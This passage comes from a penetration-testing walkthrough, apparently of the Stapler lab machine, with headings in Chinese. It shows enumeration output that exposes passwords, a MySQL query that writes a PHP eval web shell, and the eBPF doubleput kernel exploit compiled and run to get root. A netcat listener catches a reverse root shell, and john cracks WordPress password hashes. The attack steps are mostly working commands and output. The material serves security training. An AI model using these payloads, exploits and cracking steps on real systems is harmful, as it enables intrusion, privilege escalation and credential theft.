/var/www/https/blogblog/wp-content/uploads/w10.php
/var/www/https/blogblog/wp-content/uploads/w1.php
/var/www/https/blogblog/wp-content/uploads/w30.php

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group SHayslett:
/var/www/https/blogblog/wp-content/uploads/w1.php
/tmp/linpeas.sh

╔══════════╣ Searching passwords in history files
sshpass -p thisimypassword ssh JKanode@localhost
sshpass -p JZQuyIN5 peter@localhost
sudo -l
sudo -l
select\040'<?php\040@eval($_GET["cmd"]);\040?>'\040from\040wp_users\040limit\0401\040into\040dumpfile\040'/var/www/https/blogblog/wp-content/uploads/s.php';
Binary file /usr/share/phpmyadmin/js/openlayers/theme/default/img/navigation_history.png matches
SUFFIX="$SUFFIX$ISUFFIX"
_history_complete_word "$@"
	"r:root - strip suffix"

╔══════════╣ Searching passwords in config PHP files
    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['nopassword'] = false;
$cfg['ShowChgPassword'] = true;
	define('DB_PASSWORD', $pwd);
	define('DB_USER', $uname);
	$pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
define('DB_PASSWORD', 'plbkac');
define('DB_USER', 'root');
define('DB_PASSWORD', 'password_here');
define('DB_USER', 'username_here');

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/etc/ssl/certs/red.key
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/i386-linux-gnu/libsamba-credentials.so.0
/usr/lib/i386-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/i386-linux-gnu/samba/ldb/local_password.so
/usr/lib/i386-linux-gnu/samba/ldb/password_hash.so
/usr/lib/i386-linux-gnu/samba/libcmdline-credentials.so.0
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python2.7/dist-packages/samba/credentials.so
/usr/lib/python2.7/dist-packages/samba/tests/credentials.py
/usr/lib/python2.7/dist-packages/samba/tests/credentials.pyc
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/phpmyadmin/libraries/display_change_password.lib.php
/usr/share/phpmyadmin/user_password.php
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/https/blogblog/wp-admin/js/password-strength-meter.js
/var/www/https/blogblog/wp-admin/js/password-strength-meter.min.js

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2022-07-05 18:47:35 configure passwd:i386 1:4.2-3.1ubuntu5.3 <none>
2022-07-05 18:47:35 status half-configured passwd:i386 1:4.2-3.1ubuntu5
2022-07-05 18:47:35 status half-configured passwd:i386 1:4.2-3.1ubuntu5.3
2022-07-05 18:47:35 status half-installed passwd:i386 1:4.2-3.1ubuntu5
2022-07-05 18:47:35 status installed passwd:i386 1:4.2-3.1ubuntu5.3
2022-07-05 18:47:35 status unpacked passwd:i386 1:4.2-3.1ubuntu5
2022-07-05 18:47:35 status unpacked passwd:i386 1:4.2-3.1ubuntu5.3
2022-07-05 18:47:35 upgrade passwd:i386 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
```
```shell
SHayslett@red:/tmp$ unzip 39772.zip
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store
  inflating: 39772/crasher.tar
  inflating: __MACOSX/39772/._crasher.tar
  inflating: 39772/exploit.tar
  inflating: __MACOSX/39772/._exploit.tar
SHayslett@red:/tmp$ ls -al
total 808
drwxrwxrwt 10 root      root        4096 Jul  5 20:32 .
drwxr-xr-x 22 root      root        4096 Jun  7  2016 ..
drwxr-xr-x  2 SHayslett SHayslett   4096 Aug 15  2016 39772
-rw-rw-r--  1 SHayslett SHayslett   7025 Jul  5 12:31 39772.zip
prw-r--r--  1 www-data  www-data       0 Jul  5 19:12 backpipe
drwxrwxrwt  2 root      root        4096 Jul  5 18:32 .font-unix
drwxrwxrwt  2 root      root        4096 Jul  5 18:32 .ICE-unix
-rwxrw-r--  1 SHayslett SHayslett 776967 Jul  5 11:54 linpeas.sh
drwxrwxr-x  3 SHayslett SHayslett   4096 Aug 15  2016 __MACOSX
drwxrwxrwt  2 root      root        4096 Jul  5 18:32 .Test-unix
drwx------  2 SHayslett SHayslett   4096 Jul  5 19:56 tmux-1005
drwxrwxrwt  2 root      root        4096 Jul  5 18:32 .X11-unix
drwxrwxrwt  2 root      root        4096 Jul  5 18:32 .XIM-unix
SHayslett@red:/tmp$ cd 39772
SHayslett@red:/tmp/39772$ ls -al
total 48
drwxr-xr-x  2 SHayslett SHayslett  4096 Aug 15  2016 .
drwxrwxrwt 10 root      root       4096 Jul  5 20:32 ..
-rw-r--r--  1 SHayslett SHayslett 10240 Aug 15  2016 crasher.tar
-rw-r--r--  1 SHayslett SHayslett  6148 Aug 15  2016 .DS_Store
-rw-r--r--  1 SHayslett SHayslett 20480 Aug 15  2016 exploit.tar
SHayslett@red:/tmp/39772$ tar -zvf exploit.tar
tar: You must specify one of the '-Acdtrux', '--delete' or '--test-label' options
Try 'tar --help' or 'tar --usage' for more information.
SHayslett@red:/tmp/39772$ tar -xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
SHayslett@red:/tmp/39772$ ls -al
total 52
drwxr-xr-x  3 SHayslett SHayslett  4096 Jul  5 20:32 .
drwxrwxrwt 10 root      root       4096 Jul  5 20:32 ..
-rw-r--r--  1 SHayslett SHayslett 10240 Aug 15  2016 crasher.tar
-rw-r--r--  1 SHayslett SHayslett  6148 Aug 15  2016 .DS_Store
drwxr-x---  2 SHayslett SHayslett  4096 Apr 25  2016 ebpf_mapfd_doubleput_exploit
-rw-r--r--  1 SHayslett SHayslett 20480 Aug 15  2016 exploit.tar
SHayslett@red:/tmp/39772$ cd ebpf_mapfd_doubleput_exploit/
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -al
total 28
drwxr-x--- 2 SHayslett SHayslett 4096 Apr 25  2016 .
drwxr-xr-x 3 SHayslett SHayslett 4096 Jul  5 20:32 ..
-rwxr-x--- 1 SHayslett SHayslett  155 Apr 25  2016 compile.sh
-rw-r----- 1 SHayslett SHayslett 4188 Apr 25  2016 doubleput.c
-rw-r----- 1 SHayslett SHayslett 2186 Apr 25  2016 hello.c
-rw-r----- 1 SHayslett SHayslett  255 Apr 25  2016 suidhelper.c
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
```
## 3. 定时任务提权
```shell
┌──(root㉿kali)-[~]
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.150] 58712
id
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty; pty.spawn("/bin/bash");'
root@red:~# whoami
whoami
root
root@red:~# ifconfig
ifconfig
bash: ifconfig: command not found
root@red:~# /sbin/ifconfig
/sbin/ifconfig
enp0s3    Link encap:Ethernet  HWaddr 08:00:27:84:af:b6
          inet addr:192.168.0.150  Bcast:192.168.0.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:100936 errors:1 dropped:0 overruns:0 frame:0
          TX packets:94644 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:131008156 (131.0 MB)  TX bytes:12025411 (12.0 MB)
          Interrupt:9 Base address:0xd000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:3052 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3052 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:338414 (338.4 KB)  TX bytes:338414 (338.4 KB)

root@red:~# ls -al
ls -al
total 208
drwx------  4 root root  4096 Jul  5 19:43 .
drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
-rw-------  1 root root     1 Jun  5  2016 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
-rw-r--r--  1 root root   345 Jun  5  2016 issue
-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
-rw-------  1 root root     1 Jun  5  2016 .mysql_history
drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
-rw-------  1 root root  1024 Jun  5  2016 .rnd
drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
-rw-------  1 root root     1 Jun  5  2016 .viminfo
-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
-rw-r--r--  1 root root 39227 Jul  5 19:27 .zcompdump
-rw-r--r--  1 root root 39373 Jul  5 19:27 .zcompdump-red-5.1.1
-rw-------  1 root root    39 Jun  5  2016 .zsh_history
-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
root@red:~# cat flag.txt
cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```
# Conclusion
## 1. 利用john进行密码破解：
导出mysql存放的用户名和密码
```shell
┌──(root㉿kali)-[/stapler]
└─# cat mysqlpass.txt
John:$P$B7889EMq/erHIuZapMB8GEizebcIy9.
Elly:$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0
Peter:$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0
barry:$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0
heather:$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10
garry:$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1
harry:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0
scott:$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1
kathy:$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0
tim:$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0
ZOE:$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1
Dave:$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.
Simon:$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0
Abby:$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.
Vicki:$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131
Pam:$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0
┌──(root㉿kali)-[/stapler]
└─# john mysqlpass.txt --show --format=phpass > cracked.txt

┌──(root㉿kali)-[/stapler]
└─# cat cracked.txt
John:incorrect
Elly:ylle
barry:washere
heather:passphrase
garry:football
harry:monkey
scott:cookie
kathy:coolgirl
tim:thumb
ZOE:partyqueen
Dave:damachine
Pam:0520
```